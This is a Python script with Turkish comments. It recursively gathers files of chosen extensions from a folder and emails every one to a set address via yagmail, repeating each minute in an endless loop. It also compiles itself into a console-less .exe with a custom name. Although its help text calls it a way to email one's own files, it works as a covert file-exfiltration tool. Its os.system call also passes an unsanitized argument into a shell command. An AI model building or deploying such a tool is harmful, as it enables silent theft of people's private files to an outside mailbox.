import os
import glob
import yagmail
import argparse
from getpass import getpass
import time

def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
    try:
        # Yagmail istemciyi oluşturalım
        yag = yagmail.SMTP(sender_email, sender_password)

        # E-posta gönderme işlemi
        yag.send(
            to=receiver_email,
            subject=subject,
            contents=body,
            attachments=attachment_path,
        )
        print(f"E-posta {attachment_path} başarıyla gönderildi.")
        # Yagmail istemciyi kapat
        yag.close()
    except Exception as e:
        print(f"Hata oluştu: {e}")

if __name__ == "__main__":
    # Argümanları işlemek için argparse nesnesi oluşturalım
    parser = argparse.ArgumentParser(description="Bilgisayarınızdaki dosyaları e-postayla gönderin.")
    parser.add_argument("-s", "--sender-email", required=True, help="Gönderen e-posta adresi")
    parser.add_argument("-p", "--sender-password", required=True, help="Gönderen e-posta şifresi")
    parser.add_argument("-r", "--receiver-email", required=True, help="Alıcı e-posta adresi")
    parser.add_argument("-d", "--folder-path", required=True, help="Taramak istediğiniz klasör yolunu belirtin")
    parser.add_argument("-n", "--file-name", required=True, help="Dönüşüm sonucu oluşacak .exe dosyasının adını belirtin")
    parser.add_argument("-e", "--file-extensions", nargs="+", required=True, help="Taramak istediğiniz dosya uzantılarını girin (örn: -e pdf jpg png)")

    args = parser.parse_args()

    # E-posta hesap bilgilerini alalım
    sender_email = args.sender_email
    sender_password = args.sender_password
    receiver_email = args.receiver_email

    # Kullanıcı tarafından belirlenen dosya uzantılarını alalım ve hepsini küçük harfe dönüştürelim
    file_extensions = [ext.lower() for ext in args.file_extensions]

    # Kullanıcı tarafından belirlenen klasör yolunu alalım
    folder_path = args.folder_path

    # Belirtilen klasördeki dosyaları ve alt klasörlerdeki dosyaları tarayalım
    attachment_files = []
    for extension in file_extensions:
        attachment_files.extend(glob.glob(os.path.join(folder_path, f"**/*.{extension}"), recursive=True))

    # E-posta konusu ve içeriğini belirleyelim
    subject = "Dosyalarınız Ektedir"
    body = "İşte dosyalarınız."

    while True:
        for attachment_file in attachment_files:
            # E-posta gönderme işlemini çağıralım
            send_email(sender_email, sender_password, receiver_email, subject, body, attachment_file)

        # .exe dosyasının adını alalım
        exe_file_name = args.file_name

        # Python betiğini .exe dosyasına dönüştürelim
        os.system(f"pyinstaller --onefile MailAttach.py -n {exe_file_name} --noconsole")

        # 1 dakika bekleyelim ve sonra taramayı tekrarlayalım
        time.sleep(60)
